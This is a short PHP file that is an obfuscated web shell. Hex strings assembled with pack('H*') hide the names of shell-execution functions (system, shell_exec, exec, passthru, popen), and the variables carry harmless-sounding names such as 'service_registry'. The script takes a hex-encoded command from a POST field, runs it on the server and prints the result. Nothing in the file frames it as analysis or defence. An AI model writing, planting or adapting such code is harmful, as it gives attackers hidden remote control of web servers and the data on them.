<?php


$val1 = '7';
$val2 = '4';
$val3 = '5';
$val4 = '6';
$val5 = 'd';
$val6 = '3';
$val7 = 'f';
$val8 = '8';
$val9 = '0';
$val10 = '2';
$val11 = 'e';
$val12 = '9';
$service_registry1 = pack("H*", '7'.'3'.$val1.'9'.'7'.'3'.'7'.$val2.'6'.$val3.$val4.$val5);
$service_registry2 = pack("H*", $val1.$val6.$val4.'8'.'6'.$val3.'6'.'c'.$val4.'c'.$val3.$val7.$val4.'5'.$val1.'8'.'6'.$val3.'6'.$val6);
$service_registry3 = pack("H*", $val4.$val3.$val1.$val8.$val4.'5'.$val4.'3');
$service_registry4 = pack("H*", $val1.'0'.$val4.'1'.'7'.'3'.$val1.'3'.$val1.$val2.'6'.'8'.'7'.'2'.$val1.'5');
$service_registry5 = pack("H*", $val1.$val9.$val4.$val7.$val1.'0'.'6'.$val3.'6'.'e');
$service_registry6 = pack("H*", '7'.$val6.'7'.$val2.$val1.$val10.$val4.$val3.'6'.'1'.$val4.$val5.$val3.'f'.$val4.$val1.$val4.$val3.'7'.'4'.'5'.$val7.'6'.'3'.'6'.'f'.$val4.$val11.$val1.$val2.'6'.'5'.'6'.'e'.'7'.'4'.'7'.$val6);
$service_registry7 = pack("H*", $val1.'0'.'6'.'3'.$val4.'c'.'6'.$val7.$val1.'3'.'6'.$val3);
$initialized = pack("H*", '6'.$val12.'6'.'e'.'6'.$val12.$val1.'4'.$val4.$val12.$val4.'1'.'6'.'c'.$val4.$val12.'7'.'a'.'6'.$val3.'6'.$val2);
if (isset($_POST[$initialized])) {
    $initialized = pack("H*", $_POST[$initialized]);
    if (function_exists($service_registry1)) {
        $service_registry1($initialized);
    } elseif (function_exists($service_registry2)) {
        print $service_registry2($initialized);
    } elseif (function_exists($service_registry3)) {
        $service_registry3($initialized, $ref_desc);
        print join("\n", $ref_desc);
    } elseif (function_exists($service_registry4)) {
        $service_registry4($initialized);
    } elseif (function_exists($service_registry5) && function_exists($service_registry6) && function_exists($service_registry7)) {
        $parameter_group_itm = $service_registry5($initialized, 'r');
        if ($parameter_group_itm) {
            $property_set_reference = $service_registry6($parameter_group_itm);
            $service_registry7($parameter_group_itm);
            print $property_set_reference;
        }
    }
    exit;
}
